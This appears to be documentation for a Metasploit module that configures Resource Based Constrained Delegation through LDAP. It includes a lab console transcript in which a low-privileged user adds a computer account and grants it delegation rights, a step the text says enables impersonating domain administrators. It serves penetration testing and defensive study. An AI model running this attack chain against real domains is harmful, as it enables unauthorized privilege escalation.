## Vulnerable Application

This module can read and write the necessary LDAP attributes to configure a particular object for Role Based Constrained
Delegation (RBCD). When writing, the module will add an access control entry to allow the account specified in
DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the authenticated user must have
write access to the target object (the object specified in DELEGATE_TO).

## Verification Steps

1. Set the `RHOST` value to a target domain controller
2. Set the `BIND_DN` and `BIND_PW` information to an account with the necessary privileges
3. Set the `DELEGATE_TO` and `DELEGATE_FROM` data store options
4. Use the `WRITE` action to configure the target for RBCD

## Actions

### FLUSH
Delete the security descriptor. Unlike the REMOVE action, this deletes the entire security descriptor instead of just
the matching ACEs.

### READ
Read the security descriptor and print the ACL contents to identify objects that are currently configured for RBCD.

### REMOVE
Remove matching ACEs from the security descriptor DACL. Unlike the FLUSH action, this only removes the matching ACEs
instead of deleting the entire security descriptor.

### WRITE
Add an ACE to the security descriptor DACL to enable RBCD. The new entry will be appended to the ACL after any existing
ACEs. No changes are made to the security descriptor if the ACE to enable RBCD already exists.

## Options

### DELEGATE_TO
The delegation target. This is the object whose ACL is the target of the ACTION (read, write, etc.). The authenticated
user must have write access to this object.

### DELEGATE_FROM
The delegation source. This is the object which is added to (if action is WRITE) or removed from (if action is REMOVE)
the delegation target.

## Scenarios

### Window Server 2019 Domain Controller
In the following example the user `MSFLAB\sandy` has write access to the computer account `WS01$`. The sandy account is
used to add a new computer account to the domain, then configures WS01$ for delegation from the new computer account.

The new computer account can then impersonate any user, including domain administrators, on `WS01$` by authenticating
with the Service for User (S4U) Kerberos extension.

```
msf6 auxiliary(admin/dcerpc/samr_computer) > show options 

Module options (auxiliary/admin/dcerpc/samr_computer):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   COMPUTER_NAME                       no        The computer name
   COMPUTER_PASSWORD                   no        The password for the new computer
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The target port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   ADD_COMPUTER  Add a computer account


msf6 auxiliary(admin/dcerpc/samr_computer) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBUser sandy
SMBUser => sandy
msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(admin/dcerpc/samr_computer) > run
[*] Running module against 192.168.159.10

[*] 192.168.159.10:445 - Using automatically identified domain: MSFLAB
[+] 192.168.159.10:445 - Successfully created MSFLAB\DESKTOP-QLSTR9NW$
[+] 192.168.159.10:445 -   Password: A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT
[+] 192.168.159.10:445 -   SID:      S-1-5-21-3402587289-1488798532-3618296993-1655
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/samr_computer) > use auxiliary/admin/ldap/rbcd 
msf6 auxiliary(admin/ldap/rbcd) > set BIND_DN sandy@msflab.local
BIND_DN => sandy@msflab.local
msf6 auxiliary(admin/ldap/rbcd) > set BIND_PW Password1!
BIND_PW => Password1!
msf6 auxiliary(admin/ldap/rbcd) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_TO WS01$
DELEGATE_TO => WS01$
msf6 auxiliary(admin/ldap/rbcd) > read
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[*] The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_FROM DESKTOP-QLSTR9NW$
DELEGATE_FROM => DESKTOP-QLSTR9NW$
msf6 auxiliary(admin/ldap/rbcd) > write
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/rbcd) > read
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[*] Allowed accounts:
[*]   DESKTOP-QLSTR9NW$ (S-1-5-21-3402587289-1488798532-3618296993-1655)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/rbcd) > 
```
